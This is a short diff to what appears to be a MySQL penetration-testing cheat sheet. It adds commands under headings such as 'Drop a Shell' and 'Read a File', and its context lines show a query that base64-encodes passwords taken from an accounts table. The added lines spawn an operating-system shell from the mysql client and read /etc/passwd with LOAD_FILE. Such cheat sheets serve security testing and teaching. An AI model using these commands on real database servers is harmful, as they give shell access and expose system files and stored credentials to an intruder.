@@ -199,7 +199,15 @@ mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
 ### Drop a Shell
 
 ```c
-mysql> \! /bin/sh
+mysql> \! sh;
+mysql> \! /bin/sh;
+```
+
+### Read a File
+
+```c
+mysql> SELECT LOAD_FILE('/etc/passwd');
+mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
 ```
 
 ### Insert Code to get executed
